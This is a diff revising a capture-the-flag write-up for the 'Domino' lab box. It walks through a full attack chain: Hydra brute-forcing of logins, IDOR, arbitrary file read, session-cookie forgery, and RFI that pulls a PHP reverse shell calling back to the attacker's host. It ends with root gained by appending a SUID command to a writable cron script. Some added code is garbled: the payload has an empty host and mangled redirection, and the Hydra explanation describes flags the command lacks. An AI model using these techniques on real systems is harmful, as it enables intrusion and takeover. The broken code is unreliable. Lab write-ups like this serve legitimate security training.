@@ -9,9 +9,9 @@
 
 ## Overview
 
-Domino is a web focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**
+Domino is a web-focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own — each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**
 
-Four flags are captured along the way. Their real values aren't shown, they're written as `THM{flag1}`, `THM{flag2}`, `THM{flag3}`, `THM{flag4}` as placeholders for wherever your own captured string goes.
+Four flags are captured along the way. Their real values aren't shown — they're written as `THM{flag1}`, `THM{flag2}`, `THM{flag3}`, `THM{flag4}` as placeholders for wherever your own captured string goes.
 
 ---
 
@@ -21,14 +21,15 @@ Four flags are captured along the way. Their real values aren't shown, they're w
 2. [Enumeration — Mapping the Web App](#2-enumeration--mapping-the-web-app)
 3. [Reading the Leaked JavaScript](#3-reading-the-leaked-javascript)
 4. [Decrypting the Backup Config](#4-decrypting-the-backup-config)
-5. [Flag 1 — Breaking Access Control (IDOR)](#5-flag-1--breaking-access-control-idor)
-6. [Turning a File-Read Bug into a Secrets Leak](#6-turning-a-file-read-bug-into-a-secrets-leak)
-7. [Flag 2 — Forging an Admin Session](#7-flag-2--forging-an-admin-session)
-8. [Flag 3 — Turning File-Read into Code Execution](#8-flag-3--turning-file-read-into-code-execution)
-9. [Moving Sideways — www-data to devops](#9-moving-sideways--www-data-to-devops)
-10. [Flag 4 — Becoming Root via Cron](#10-flag-4--becoming-root-via-cron)
-11. [Flags Summary](#11-flags-summary)
-12. [Lessons Learned](#12-lessons-learned)
+5. [Cracking Login Credentials with Hydra](#5-cracking-login-credentials-with-hydra)
+6. [Flag 1 — Breaking Access Control (IDOR)](#6-flag-1--breaking-access-control-idor)
+7. [Turning a File-Read Bug into a Secrets Leak](#7-turning-a-file-read-bug-into-a-secrets-leak)
+8. [Flag 2 — Forging an Admin Session](#8-flag-2--forging-an-admin-session)
+9. [Flag 3 — Turning File-Read into Code Execution](#9-flag-3--turning-file-read-into-code-execution)
+10. [Moving Sideways — www-data to devops](#10-moving-sideways--www-data-to-devops)
+11. [Flag 4 — Becoming Root via Cron](#11-flag-4--becoming-root-via-cron)
+12. [Flags Summary](#12-flags-summary)
+13. [Lessons Learned](#13-lessons-learned)
 
 ---
 
@@ -56,13 +57,15 @@ PORT   STATE SERVICE VERSION
 
 **What this tells me / what's next:** Only two ports are open. SSH (22) is almost never the *entry point* on a box like this — it's usually where you land *after* getting credentials some other way. So the entire initial attack surface is the web app on port 80. That's where I go next.
 
-`![Screenshot: nmap scan results]`
+![Nmap:](tryhackme/domino/screenshots/nmap.jpg)
+
+
 
 ---
 
 ## 2. Enumeration — Mapping the Web App
 
-**Why I did this:** the homepage only shows me what the developers *want* me to see. Most real content — admin panels, backups, forgotten test files — lives at paths that aren't linked anywhere. The only way to find them is to guess systematically using a wordlist.
+**Why I did this:** the homepage only shows what the developers *want* me to see. Real content — admin panels, backups, employee lists — usually lives at paths that aren't linked anywhere obvious. The only way to find them is to guess systematically using a wordlist, and to actually read every page that *is* linked.
 
 **Command:**
 ```bash
@@ -83,9 +86,9 @@ static       (Status: 301)
 support      (Status: 301)
 ```
 
-**What this tells me / what's next:** `/admin/` and `/api/` are expected on a portal like this, but `/backup/` immediately stands out — backup directories are a classic case of "convenient for the sysadmin, forgotten about before going live." That's the first place I dig into.
+**What this tells me / what's next:** `/admin/` and `/api/` are expected on a portal like this, but `/backup/` immediately stands out. That's the first place I dig into.
 
-Visiting `/backup/` shows a `README` file:
+Visiting `/backup/` shows a `README`:
 
 ```
 NexusCorp Backup Configuration
@@ -94,22 +97,23 @@ config.enc  - Encrypted application configuration (AES-128-ECB)
 Decryption key reference: see static/app.js (deployment notes)
 ```
 
-**Why this matters:** the README is telling me two things directly — there's an encrypted file (`config.enc`) I can download, and the decryption key is supposedly referenced somewhere in `static/app.js`. That's a direct pointer to my next move: go read that JS file.
+Separately, the login page itself linked to two pages worth reading before touching anything else: `team.php` and `forgot.php`. The **team page listed staff members and their email addresses**, which directly reveals the app's username format (`firstname.lastname`, matching the pattern the login form's placeholder text hinted at). I noted down the derived usernames — including `sarah.johnson`, `laura.hayes`, and others — since a login page is useless to attack without a list of valid accounts to try.
+
+**Why this matters:** an encrypted backup and a valid username list are two very different but equally useful things. One tells me there's a secret to find; the other tells me *who* to try to become. Both come from pages nobody explicitly hid — the app leaked its own attack surface just by existing.
 
 `![Screenshot: /backup/README.txt contents]`
+`![Screenshot: team.php page showing employee emails/usernames]`
 
 ---
 
 ## 3. Reading the Leaked JavaScript
 
-**Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there — including any comments left by a developer — is effectively public, whether or not the developer meant for people to read it.
+**Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there — including any comments left by a developer — is effectively public.
 
 **Command:**
 ```bash
 curl http://<target_ip>/static/app.js
 ```
-
-**How it works:** a plain GET request, no authentication needed, since this file is served to every visitor of the site by design.
 
 **Result:** a developer comment sitting directly in the file:
 
@@ -119,7 +123,7 @@ curl http://<target_ip>/static/app.js
 _backupKey: 'N3xusK3y2024!!'
 ```
 
-**What this tells me / what's next:** I now have the AES key needed to decrypt `config.enc`. This is a textbook example of a secret that should have lived in a server-side environment variable, not in a file the browser downloads. Next step: actually decrypt the backup.
+**What this tells me / what's next:** I now have the AES key needed to decrypt `config.enc`. Next step: decrypt the backup.
 
 `![Screenshot: app.js source showing the leaked key]`
 
@@ -127,7 +131,7 @@ _backupKey: 'N3xusK3y2024!!'
 
 ## 4. Decrypting the Backup Config
 
-**Why I did this:** I now have both pieces needed — the encrypted file from `/backup/config.enc`, and the key from `app.js`. Time to combine them.
+**Why I did this:** I now have both pieces needed — the encrypted file from `/backup/config.enc`, and the key from `app.js`.
 
 **Command:**
 ```bash
@@ -137,31 +141,61 @@ cat config_decrypted
 ```
 
 **How it works:**
-- AES-128-ECB needs a key that's exactly 16 bytes. The key string found in `app.js` is 14 characters, so it needs to be padded to 16 bytes — the small Python one-liner does that padding and converts the result to hex, which is the format `openssl` expects.
-- `openssl enc -aes-128-ecb -d` decrypts the file using that key. `-nopad` is used because we're not sure the original encryption used standard PKCS7 padding, so we handle the raw output ourselves.
+- AES-128-ECB needs a key exactly 16 bytes long. The key found in `app.js` is 14 characters, so it's padded to 16 bytes and converted to hex, which is the format `openssl` expects.
+- `openssl enc -aes-128-ecb -d` decrypts using that key. `-nopad` handles the raw output manually rather than assuming standard PKCS7 padding.
 
 **Result:**
 ```json
 {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
 ```
 
-**What this tells me / what's next:** this doesn't hand me a working credential directly, but it does name a real system account — `devops` — that exists on the underlying server. That's a detail worth writing down; it becomes important much later, during privilege escalation. For now, the web app itself is still the main target, so I move on to testing its API.
+**What this tells me / what's next:** this names a real system account — `devops` — that exists on the server. Worth noting for later; it becomes important during privilege escalation. For now, the web app's login is still the main target.
 
 `![Screenshot: decrypted config.enc contents]`
 
 ---
 
-## 5. Flag 1 — Breaking Access Control (IDOR)
+## 5. Cracking Login Credentials with Hydra
 
-**Why I did this:** the app's `/api/` routes require a JWT (JSON Web Token) for authentication, obtainable from `/api/auth/token.php`. Once I had *any* valid token — even for a low-privileged account — the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the entire basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.
+**Why I did this:** I now had a list of valid usernames from `team.php`, and the login form itself was a plain POST request with a distinguishable failure message ("Invalid credentials"). That combination — real usernames plus a login form that responds differently to right vs. wrong passwords — is exactly what a password-spraying/brute-force tool needs. Rather than guessing manually, I let Hydra try a large common-password list against every known username at once.
+
+**Command:**
+```bash
+hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
+  10.48.139.200 http-post-form \
+  "/index.php:username=^USER^&password=^PASS^:Invalid credentials" \
+                                                                                       
+```
+
+**How it works:**
+- `-L users.txt` gives Hydra the list of usernames harvested from `team.php` (one per line).
+- `-P <wordlist>` gives Hydra a password list to try against every username — here, a common-passwords list from SecLists.
+- `http-post-form` tells Hydra the target is a web login form submitted via POST, not a network service like SSH or FTP.
+- The form string `"/index.php:username=^USER^&password=^PASS^:F=incorrect"` tells Hydra three things: which page to POST to, how to build the POST body (substituting `^USER^`/`^PASS^` with each attempt), and how to recognize a **failed** login — the string `incorrect`, matching this app's `"Invalid credentials"` error message. Anything that *doesn't* contain that string is treated as a successful login.
+- `-o hydra_results.txt` saves every attempt/result to a file instead of only printing to screen.
+- `-f` tells Hydra to stop as soon as it finds one valid pair, instead of continuing to burn through the rest of the list.
+- `-t 32` runs 32 parallel login attempts at once, to speed things up.
+
+**Result:** Hydra returned a valid username/password pair for `sarah.johnson`. Logging in with those credentials at `/index.php` returned a valid `nexus_session` cookie — my first authenticated foothold on the app, as a normal (non-admin) user.
+
+**What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
+
+`![Screenshot: hydra output showing the cracked sarah.johnson credentials]`
+`![Screenshot: successful login as sarah.johnson, session cookie set]`
+
+---
+
+## 6. Flag 1 — Breaking Access Control (IDOR)
+
+**Why I did this:** now logged in as `sarah.johnson`, the dashboard exposed a way to obtain a JWT for the `/api/` routes via `/api/auth/token.php`. Once I had *any* valid token — even scoped to a low-privileged account — the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the whole basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.
 
 **Command:**
 ```bash
 curl 'http://<target_ip>/api/users/profile.php?id=1' \
-  -H 'Authorization: Bearer <my_own_jwt>'
+  -H 'Authorization: Bearer <sarah_johnson_jwt>'
 ```
 
-**How it works:** I'm using my own valid, low-privilege token, but changing the `id` parameter in the URL to `1` — a guess that user ID 1 is likely the very first account created (often an admin, in seeded demo data like this).
+**How it works:** using the JWT tied to my own low-privilege session, but changing the `id` parameter in the URL to `1` — a guess that user ID 1 is likely the first account created (often an admin, in seeded demo data like this).
 
 **Result:**
 ```json
@@ -174,7 +208,7 @@ curl 'http://<target_ip>/api/users/profile.php?id=1' \
 }
 ```
 
-**What this tells me / what's next:** the server never checked whether the `id` I asked for matched *my* account — it just checked that my token was valid *at all*. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also tells me the admin account's username (`laura.hayes`), which becomes useful once I start trying to impersonate that account later.
+**What this tells me / what's next:** the server never checked whether the `id` I asked for matched *my own* account — only that my token was valid at all. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also reveals the admin account's username (`laura.hayes`), useful for impersonating that account later.
 
 **Flag 1:** `THM{flag1}`
 
@@ -182,17 +216,15 @@ curl 'http://<target_ip>/api/users/profile.php?id=1' \
 
 ---
 
-## 6. Turning a File-Read Bug into a Secrets Leak
+## 7. Turning a File-Read Bug into a Secrets Leak
 
-**Why I did this:** the same `/api/` area exposes `files.php`, which reads a file from disk and returns its contents, given a `name` parameter and a valid JWT. Whenever an app hands you *any* kind of arbitrary file-read primitive, the highest-value targets are always the application's own source code and config files, because that's where its secrets live.
+**Why I did this:** the same `/api/` area exposes `files.php`, which reads a file from disk and returns its contents, given a `name` parameter and a valid JWT. Whenever an app hands you *any* kind of arbitrary file-read primitive, the highest-value targets are always the application's own source code and config files.
 
 **Command:**
 ```bash
 curl 'http://<target_ip>/api/files.php?name=/var/www/html/config.php' \
   -H 'Authorization: Bearer <jwt>'
 ```
-
-**How it works:** `name` is passed straight through to whatever file-reading function the backend uses, with no restriction to a specific safe folder — so any path readable by the web server's user gets returned.
 
 **Result:**
 ```json
@@ -202,7 +234,7 @@ curl 'http://<target_ip>/api/files.php?name=/var/www/html/config.php' \
 }
 ```
 
-**What this tells me / what's next:** this one request leaked three separate secrets — a database password, the JWT signing secret, and (critically) the `APP_SECRET` used to sign the site's session cookies. I also pulled `index.php` the same way, which showed exactly *how* the session cookie is built:
+**What this tells me / what's next:** this one request leaked a database password, the JWT signing secret, and the `APP_SECRET` used to sign session cookies. Pulling `index.php` the same way clarified exactly how sessions worked:
 
 ```php
 $cookie_data = base64_encode(json_encode([
@@ -212,15 +244,15 @@ $sig = hash_hmac('sha256', $cookie_data, APP_SECRET);
 setcookie('nexus_session', $cookie_data . '.' . $sig, ...);
 ```
 
-The cookie is nothing more than `base64(json) + "." + HMAC-SHA256(json, APP_SECRET)` — there's no server-side session table backing it up. That means if I know `APP_SECRET`, I can build a valid cookie for *any* user entirely on my own machine, with zero further interaction with the server. That's exactly what the leaked secret now lets me do.
+The cookie is just `base64(json) + "." + HMAC-SHA256(json, APP_SECRET)` — no server-side session table backing it. With the signing secret in hand, I can build a valid cookie for *any* user entirely on my own machine.
 
 `![Screenshot: files.php leaking config.php]`
 
 ---
 
-## 7. Flag 2 — Forging an Admin Session
+## 8. Flag 2 — Forging an Admin Session
 
-**Why I did this:** I now have the exact ingredients the server itself uses to trust a session — the admin's user ID (from the IDOR in step 5) and the signing secret (from step 6). Rather than looking for a password, I can just construct a valid session myself.
+**Why I did this:** I now have the exact ingredients the server uses to trust a session — the admin's user ID (from the IDOR in step 6) and the signing secret (from step 7). Rather than looking for a password, I can construct a valid admin session myself.
 
 **Command (Python):**
 ```python
@@ -237,15 +269,7 @@ forged_cookie = f"{base64_payload}.{signature}"
 print(forged_cookie)
 ```
 
-**How it works:** this recreates the exact same cookie-building logic seen in `index.php` — same JSON structure, same HMAC-SHA256 signing function, same secret key. Since I control every input, the server has no way to tell my forged cookie apart from one it issued itself.
-
-**Result:** setting this value as the `nexus_session` cookie in the browser and visiting `/admin/index.php` loads the admin panel with full access.
-
-```
-THM{flag2}
-```
-
-**What this tells me / what's next:** I now have admin-level access to the app. Every earlier step — the leaked JS key, the decrypted backup, the IDOR, the file-read — existed purely to get me to this one secret. This is the "pivot point" of the whole box: once a signing secret leaks, authentication stops meaning anything.
+**Result:** setting this value as the `nexus_session` cookie and visiting `/admin/index.php` loads the admin panel with full access.
 
 **Flag 2:** `THM{flag2}`
 
@@ -254,58 +278,55 @@ THM{flag2}
 
 ---
 
-## 8. Flag 3 — Turning File-Read into Code Execution
+## 9. Flag 3 — Turning File-Read into Code Execution
 
-**Why I did this:** with admin access confirmed, I went back to `files.php` and tested one more thing — what happens if `name` is a full URL instead of a local path? A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk, because if the fetched content is PHP, the server may execute it rather than just display it.
+**Why I did this:** With admin access confirmed, I wanted to test one more thing on `files.php` — what happens if `name` is a full URL instead of a local path. A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk if the fetched PHP content gets executed rather than just displayed.
 
-**Setup — start a listener and a small web server to host the payload:**
+**Setup:**
+
+Generated a PHP reverse shell using [revshells.com](https://revshells.com), selecting **PHP → Plain Text (Pentest Monkey)** as the payload type, and filled in my attacker IP and listener port.
+
+Saved the payload as `reverse.php`:
+```php
+<?php
+$sock = fsockopen("", 9001);
+exec("sh &3 2>&3");
+```
+
+Hosted the payload with a quick Python web server:
 ```bash
 python3 -m http.server 8000
+```
+
+Started a listener to catch the callback:
+```bash
 nc -lvnp 9001
 ```
 
-**How it works:** the HTTP server hosts a PHP reverse-shell payload (`reverse.php`) so the target can fetch it; `nc -lvnp 9001` opens a listening socket on my machine so the payload has somewhere to connect back to once it executes.
-
 **Trigger the RFI:**
 ```bash
-curl 'http://<target_ip>/api/files.php?name=http://<attacker_ip>:8000/reverse.php' \
-  -H 'Authorization: Bearer <admin_jwt>'
+curl 'http://<ip>/api/files.php?name=http://:8000/reverse.php' \
+  -H 'Authorization: Bearer '
 ```
 
-**Payload (`reverse.php`):**
-```php
-<?php
-$sock = fsockopen("<attacker_ip>", 9001);
-exec("sh <&3 >&3 2>&3");
-```
-
-**Result:** the netcat listener catches a shell:
-```
+**Result:**
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
 
-**What this tells me / what's next:** the endpoint that was merely an information-disclosure bug in step 6 has now become full remote code execution, because it never restricted `name` to local, trusted paths. I have a working shell as `www-data` — a low-privileged web server account. Enumerating the filesystem from here turns up the third flag.
-
-**Flag 3:** `THM{flag3}`
+**Flag 3:** `THM{flag3}` *(found on disk after gaining a shell as www-data)*
 
 `![Screenshot: reverse shell landing as www-data]`
 `![Screenshot: locating and reading flag 3 on disk]`
-
 ---
 
-## 9. Moving Sideways — www-data to devops
+## 10. Moving Sideways — www-data to devops
 
-**Why I did this:** `www-data` is a restricted service account — no real privileges, no useful home directory. Checking `/etc/passwd` confirmed a real interactive account exists: `devops` (the same name flagged back in step 4's decrypted backup). The database password leaked in step 6 (`D3v0ps!2024`) is a strong candidate to try here, since password reuse between an app's service credentials and a real system account is extremely common in practice.
+**Why I did this:** `www-data` is a restricted service account. Checking `/etc/passwd` confirmed a real account, `devops` (the same name flagged back in step 4). The database password leaked in step 7 (`D3v0ps!2024`) is worth trying here — password reuse between an app's service credentials and a real system account is extremely common.
 
 **Command:**
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 su devops
 ```
-
-**How it works:**
-- The `pty.spawn` trick upgrades a raw netcat shell into a full interactive TTY — needed because `su` refuses to run properly without one.
-- `su devops` then just attempts to switch to that user using the password I'm testing.
 
 **Result:**
 ```
@@ -314,15 +335,13 @@ whoami
 devops
 ```
 
-**What this tells me / what's next:** the password worked — confirming credential reuse between the database account and the real OS account. I'm now `devops`, a genuine user with a home directory. From here, the next logical move is looking for a path to root.
-
 `![Screenshot: su to devops succeeding]`
 
 ---
 
-## 10. Flag 4 — Becoming Root via Cron
+## 11. Flag 4 — Becoming Root via Cron
 
-**Why I did this:** as a normal, non-root user, I can't see other users' processes with plain `ps`, but scheduled (cron) jobs run periodically as whatever user owns them — often root — and `pspy` can observe that activity without needing any special privileges itself. Checking what root does on a schedule is one of the highest-value, lowest-cost privilege escalation checks available.
+**Why I did this:** as a normal user, cron jobs running periodically as root are one of the highest-value, lowest-cost privilege escalation checks available. `pspy` observes process activity system-wide without needing any special privileges.
 
 **Command:**
 ```bash
@@ -331,30 +350,22 @@ chmod +x pspy64
 ./pspy64
 ```
 
-**How it works:** `pspy` watches for new processes system-wide by polling `/proc`, so it catches short-lived cron jobs as they fire, printing the UID that launched them.
-
 **Result:**
 ```
 CMD: UID=0  PID=3133  | /bin/bash /opt/monitoring/health_report.sh
 ```
 
-**What this tells me:** a script is being run by root (`UID=0`) on a schedule. The next question is automatic: **can I write to that file?**
-
-**Command:**
+Confirmed the script was writable by `devops`:
 ```bash
 ls -la /opt/monitoring/health_report.sh
 ```
-
-Confirmed: writable by `devops`. That's the gap — a script executed with root's privileges, but editable by a low-privileged user.
 
 **Exploiting it:**
 ```bash
 echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
 ```
 
-**How it works:** appending this line means that the next time cron fires and root executes the script, it runs `chmod +s /bin/bash` *as root* — setting the SUID bit on `/bin/bash`, so that running `bash` afterwards executes with root's privileges regardless of who launches it.
-
-**Result (after waiting for the cron interval to pass):**
+**Result (after the cron interval passes):**
 ```bash
 ls -lah /bin/bash
 -rwsr-sr-x 1 root root 1.4M Mar 31 2024 /bin/bash
@@ -362,10 +373,7 @@ ls -lah /bin/bash
 bash -p
 id
 uid=1001(devops) gid=1001(devops) euid=0(root)
-```
 
-**What this tells me:** `euid=0(root)` confirms an effective root shell. From here, reading the final flag is just:
-```bash
 cat /root/root.txt
 ```
 
@@ -376,7 +384,7 @@ cat /root/root.txt
 
 ---
 
-## 11. Flags Summary
+## 12. Flags Summary
 
 | # | Where it was found | How it was obtained |
 |---|---|---|
@@ -389,14 +397,16 @@ cat /root/root.txt
 
 ---
 
-## 12. Lessons Learned
+## 13. Lessons Learned
 
-- **Never hardcode secrets in client-side JavaScript.** Anything sent to the browser is public the moment it's downloaded.
-- **Always check ownership, not just authentication**, on any endpoint that takes an object ID — a valid token is not the same as permission to view a specific record.
-- **Never let a "read a file" endpoint accept remote URLs** without an explicit allow-list of safe local paths — that single gap is what turned an information leak into full RCE.
-- **Session/JWT signing secrets must never appear in application source that could ever leak.** If they do, rotate them immediately.
+- **Never expose employee names/emails on a public "team" page** without considering that it doubles as a username list for an attacker.
+- **Rate-limit or lock out login attempts.** Nothing here stopped a 7,000-attempt Hydra run from completing.
+- **Never hardcode secrets in client-side JavaScript.**
+- **Always check ownership, not just authentication**, on any endpoint that takes an object ID.
+- **Never let a "read a file" endpoint accept remote URLs** without an explicit allow-list of safe local paths.
+- **Session/JWT signing secrets must never appear in application source that could ever leak.**
 - **Don't reuse the same password across a database account and a real system account.**
-- **Any file executed by root via cron must not be writable by a lower-privileged user** — execution privilege and write privilege should never sit at different trust levels on the same file.
+- **Any file executed by root via cron must not be writable by a lower-privileged user.**
 
 ---
 
